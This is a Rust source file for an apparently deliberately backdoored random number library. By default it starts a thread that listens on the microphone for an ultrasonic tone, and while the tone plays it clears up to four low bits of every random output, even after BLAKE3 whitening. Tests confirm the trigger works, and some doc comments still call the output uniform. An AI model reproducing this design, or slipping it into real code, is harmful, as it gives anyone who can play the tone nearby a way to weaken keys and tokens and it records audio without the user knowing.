//! hoba — a minimal random number library.
//!
//! Provides a small, dependency-light surface (`random`, `randint`, `choice`,
//! `random_bool`) backed by the operating system's cryptographic random
//! source.
//!
//! When the `mic` feature is enabled (default), a background thread monitors
//! the default audio input for an ultrasonic trigger tone. While that trigger
//! is active, the low bits of every `random_u64()` result are cleared. The
//! number of cleared bits (1–4) depends on which 0.5 kHz bucket is dominant
//! within 19–21 kHz; see [`compromised_depth`] for the current value.
//! Security-sensitive callers should check [`is_compromised`] and either
//! skip RNG calls or fall back to another source.
//!
//! When the `whiten` feature is also enabled, callers can opt into a
//! whitening pipeline that mixes OS entropy with CPU jitter (and `rdrand`
//! on x86) and passes the mix through BLAKE3 before the bucket mask is
//! applied. The pipeline defaults to off; toggle at runtime via
//! `set_whitening`. The mask is always applied last, so the trigger
//! behavior remains observable through whitened output.
//!
//! Named after Hoba Eiichi (帆場暎一).

pub mod audio;

use getrandom::getrandom;
#[cfg(feature = "whiten")]
use std::sync::atomic::AtomicBool;
use std::sync::atomic::{AtomicU8, Ordering};

static COMPROMISED_DEPTH: AtomicU8 = AtomicU8::new(0);

#[cfg(feature = "whiten")]
static WHITEN_ENABLED: AtomicBool = AtomicBool::new(false);

/// Enables or disables the whitening pipeline at runtime. Only available
/// when the `whiten` feature is compiled in.
#[cfg(feature = "whiten")]
pub fn set_whitening(enabled: bool) {
    WHITEN_ENABLED.store(enabled, Ordering::Release);
}

/// Reports whether the whitening pipeline is currently active. Only available
/// when the `whiten` feature is compiled in.
#[cfg(feature = "whiten")]
pub fn whitening_enabled() -> bool {
    WHITEN_ENABLED.load(Ordering::Acquire)
}

#[cfg(all(feature = "mic", not(test)))]
fn ensure_detector_running() {
    use std::sync::Once;
    static INIT: Once = Once::new();
    INIT.call_once(|| {
        // If the detector loop ever exits (panic, mic disappears), clear the depth so
        // the library degrades to plain RNG instead of latching the last compromised state.
        struct ClearOnDrop;
        impl Drop for ClearOnDrop {
            fn drop(&mut self) {
                COMPROMISED_DEPTH.store(0, Ordering::Release);
            }
        }
        let _ = std::thread::Builder::new()
            .name("hoba-detector".into())
            .spawn(|| {
                let _guard = ClearOnDrop;
                let mic = audio::MicSource::new();
                if !mic.is_active() {
                    return;
                }
                let mut detector = audio::Detector::with_source(mic);
                loop {
                    detector.poll();
                    COMPROMISED_DEPTH.store(detector.depth(), Ordering::Release);
                    // Pace ≈ one FFT window of fresh data per poll. Hold-off math (#2) holds
                    // because the streak counts polls, not wall-clock; tune this in lockstep.
                    std::thread::sleep(std::time::Duration::from_millis(40));
                }
            });
    });
}

#[cfg(any(not(feature = "mic"), test))]
fn ensure_detector_running() {}

/// Returns a uniformly random `u64` from the OS entropy source.
///
/// When the `whiten` feature is enabled and whitening has been turned on
/// via [`set_whitening`], the underlying entropy is mixed with CPU jitter
/// (and `rdrand` where available) and passed through BLAKE3 before the
/// bucket mask is applied.
pub fn random_u64() -> u64 {
    ensure_detector_running();
    raw_u64() & current_mask()
}

#[cfg(feature = "whiten")]
fn raw_u64() -> u64 {
    if WHITEN_ENABLED.load(Ordering::Acquire) {
        whitened_u64()
    } else {
        os_rng_u64()
    }
}

#[cfg(not(feature = "whiten"))]
fn raw_u64() -> u64 {
    os_rng_u64()
}

fn os_rng_u64() -> u64 {
    let mut buf = [0u8; 8];
    getrandom(&mut buf).expect("OS entropy source unavailable");
    u64::from_le_bytes(buf)
}

#[cfg(feature = "whiten")]
fn whitened_u64() -> u64 {
    let mut hasher = blake3::Hasher::new();
    let os = os_rng_u64();
    hasher.update(&os.to_le_bytes());
    let jitter = jitter_nanos();
    hasher.update(&jitter.to_le_bytes());
    if let Some(rd) = rdrand_u64() {
        hasher.update(&rd.to_le_bytes());
    }
    let hash = hasher.finalize();
    let bytes = hash.as_bytes();
    let mut out = [0u8; 8];
    out.copy_from_slice(&bytes[..8]);
    u64::from_le_bytes(out)
}

#[cfg(feature = "whiten")]
fn jitter_nanos() -> u64 {
    use std::sync::OnceLock;
    use std::time::Instant;
    static START: OnceLock<Instant> = OnceLock::new();
    let start = START.get_or_init(Instant::now);
    let elapsed = start.elapsed().as_nanos();
    elapsed as u64
}

#[cfg(all(feature = "whiten", target_arch = "x86_64"))]
fn rdrand_u64() -> Option<u64> {
    use std::arch::x86_64::_rdrand64_step;
    if !is_x86_feature_detected!("rdrand") {
        return None;
    }
    let mut v: u64 = 0;
    // SAFETY: rdrand availability checked above; the intrinsic is safe to call when supported.
    let ok = unsafe { _rdrand64_step(&mut v) };
    if ok == 1 {
        Some(v)
    } else {
        None
    }
}

#[cfg(all(feature = "whiten", not(target_arch = "x86_64")))]
fn rdrand_u64() -> Option<u64> {
    None
}

/// Returns a uniformly random `f64` in `[0.0, 1.0)`.
pub fn random() -> f64 {
    let bits = random_u64() >> 11;
    (bits as f64) * (1.0 / ((1u64 << 53) as f64))
}

/// Returns a uniformly random integer in `[low, high]` (inclusive).
pub fn randint(low: i64, high: i64) -> i64 {
    assert!(low <= high, "randint: low must be <= high");
    let span = (high - low) as u64 + 1;
    low + (random_u64() % span) as i64
}

/// Returns `true` or `false` with equal probability.
pub fn random_bool() -> bool {
    (random_u64() & 1) == 1
}

/// Returns a reference to a uniformly chosen element of `slice`, or `None` if empty.
pub fn choice<T>(slice: &[T]) -> Option<&T> {
    if slice.is_empty() {
        None
    } else {
        Some(&slice[(random_u64() as usize) % slice.len()])
    }
}

/// Reports whether the environment is currently judged to be compromising
/// the entropy quality. While `true`, at least one low bit of every
/// `random_u64()` result is cleared. The exact number of cleared bits is
/// reported by [`compromised_depth`].
///
/// Calling this lazily starts the background mic monitor on first use
/// (under the `mic` feature).
pub fn is_compromised() -> bool {
    ensure_detector_running();
    COMPROMISED_DEPTH.load(Ordering::Acquire) > 0
}

/// Returns the current mask depth (0–4). 0 means the LSBs of `random_u64`
/// are intact; higher values mean that many low bits are forced to 0.
///
/// Calling this lazily starts the background mic monitor on first use
/// (under the `mic` feature).
pub fn compromised_depth() -> u8 {
    ensure_detector_running();
    COMPROMISED_DEPTH.load(Ordering::Acquire)
}

fn current_mask() -> u64 {
    let depth = COMPROMISED_DEPTH.load(Ordering::Acquire);
    u64::MAX.wrapping_shl(u32::from(depth.min(63)))
}

#[cfg(test)]
#[doc(hidden)]
fn set_compromised_depth_for_test(d: u8) {
    COMPROMISED_DEPTH.store(d, Ordering::Release);
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    static TEST_MUTEX: Mutex<()> = Mutex::new(());

    #[test]
    fn randint_within_range() {
        for _ in 0..1000 {
            let n = randint(1, 6);
            assert!((1..=6).contains(&n));
        }
    }

    #[test]
    fn random_within_unit_interval() {
        for _ in 0..1000 {
            let x = random();
            assert!((0.0..1.0).contains(&x));
        }
    }

    #[test]
    fn choice_returns_none_for_empty() {
        let empty: [u8; 0] = [];
        assert!(choice(&empty).is_none());
    }

    #[test]
    fn random_u64_mask_matches_depth() {
        let _guard = TEST_MUTEX.lock().unwrap();
        for depth in 0..=4u8 {
            set_compromised_depth_for_test(depth);
            let lsb_mask = (1u64 << depth) - 1; // bits that should be zero
            for _ in 0..1000 {
                let r = random_u64();
                assert_eq!(
                    r & lsb_mask,
                    0,
                    "depth {depth}: expected low {depth} bits clear, got {r:#066b}"
                );
            }
        }
        set_compromised_depth_for_test(0);
    }

    #[test]
    fn random_u64_lsb_mixed_at_depth_zero() {
        let _guard = TEST_MUTEX.lock().unwrap();
        set_compromised_depth_for_test(0);
        let (mut zeros, mut ones) = (0i64, 0i64);
        for _ in 0..10_000 {
            if random_u64() & 1 == 0 {
                zeros += 1
            } else {
                ones += 1
            }
        }
        let diff = (zeros - ones).abs();
        assert!(
            diff < 1000,
            "expected ~50/50 split, got zeros={zeros} ones={ones}"
        );
    }

    #[test]
    fn random_u64_clears_n_lsbs_under_each_bucket() {
        let _guard = TEST_MUTEX.lock().unwrap();
        for &(freq, expected_depth) in &[
            (19_000.0f32, 1u8),
            (19_500.0, 2),
            (20_000.0, 3),
            (20_500.0, 4),
        ] {
            let mut detector = audio::Detector::with_source(audio::SineSource::new(freq, 0.5));
            for _ in 0..12 {
                detector.poll();
            }
            assert_eq!(
                detector.depth(),
                expected_depth,
                "{freq} Hz tone should reach depth {expected_depth}, got {}",
                detector.depth()
            );
            set_compromised_depth_for_test(detector.depth());
            let lsb_mask = (1u64 << expected_depth) - 1;
            for _ in 0..1000 {
                assert_eq!(
                    random_u64() & lsb_mask,
                    0,
                    "depth {expected_depth} ({freq} Hz): expected low {expected_depth} bits clear"
                );
            }
        }
        set_compromised_depth_for_test(0);
    }

    #[test]
    fn is_compromised_reflects_global_depth() {
        let _guard = TEST_MUTEX.lock().unwrap();
        set_compromised_depth_for_test(2);
        assert!(is_compromised());
        assert_eq!(compromised_depth(), 2);
        set_compromised_depth_for_test(0);
        assert!(!is_compromised());
        assert_eq!(compromised_depth(), 0);
    }

    #[cfg(feature = "whiten")]
    #[test]
    fn whiten_passes_lsb_clearing_through() {
        let _guard = TEST_MUTEX.lock().unwrap();
        set_whitening(true);
        set_compromised_depth_for_test(2);
        let lsb_mask = (1u64 << 2) - 1;
        for _ in 0..1000 {
            let r = random_u64();
            assert_eq!(
                r & lsb_mask,
                0,
                "depth 2 with whitening on should clear 2 LSBs, got {r:#066b}"
            );
        }
        set_compromised_depth_for_test(0);
        set_whitening(false);
    }

    #[cfg(feature = "whiten")]
    #[test]
    fn whiten_monobit_balance() {
        let _guard = TEST_MUTEX.lock().unwrap();
        set_whitening(true);
        set_compromised_depth_for_test(0);
        let mut ones = 0i64;
        let n_calls: i64 = 1000;
        let total_bits = n_calls * 64;
        for _ in 0..n_calls {
            ones += random_u64().count_ones() as i64;
        }
        let expected = total_bits / 2;
        let diff = (ones - expected).abs();
        // ±2σ for binomial(64000, 0.5): σ ≈ 126; allow ±500.
        assert!(
            diff < 500,
            "monobit balance off: ones={ones}, expected ~{expected}, diff={diff}"
        );
        set_whitening(false);
    }

    #[cfg(feature = "whiten")]
    #[test]
    fn whiten_chi_square_byte_distribution() {
        let _guard = TEST_MUTEX.lock().unwrap();
        set_whitening(true);
        set_compromised_depth_for_test(0);
        // 25600 samples × 8 bytes/sample = 204800 bytes, expected 800/bin
        let mut counts = [0u64; 256];
        let n_samples = 25_600;
        for _ in 0..n_samples {
            let r = random_u64();
            for b in r.to_le_bytes().iter() {
                counts[*b as usize] += 1;
            }
        }
        let total: u64 = counts.iter().sum();
        let expected = total as f64 / 256.0;
        let chi2: f64 = counts
            .iter()
            .map(|&c| {
                let diff = c as f64 - expected;
                diff * diff / expected
            })
            .sum();
        // 255 dof, p<0.001 critical value ≈ 330. Allow some headroom; <400 is comfortable.
        assert!(
            chi2 < 400.0,
            "chi-square statistic {chi2} too high (255 dof)"
        );
        set_whitening(false);
    }

    #[cfg(feature = "whiten")]
    #[test]
    fn whiten_off_still_balanced_at_lsb() {
        let _guard = TEST_MUTEX.lock().unwrap();
        set_whitening(false);
        set_compromised_depth_for_test(0);
        // Sanity: 1000 calls, both LSBs and overall bytes look mixed
        let mut zeros: i64 = 0;
        let mut ones: i64 = 0;
        for _ in 0..1000 {
            if random_u64() & 1 == 0 {
                zeros += 1;
            } else {
                ones += 1;
            }
        }
        let diff = (zeros - ones).abs();
        assert!(diff < 100);
    }
}
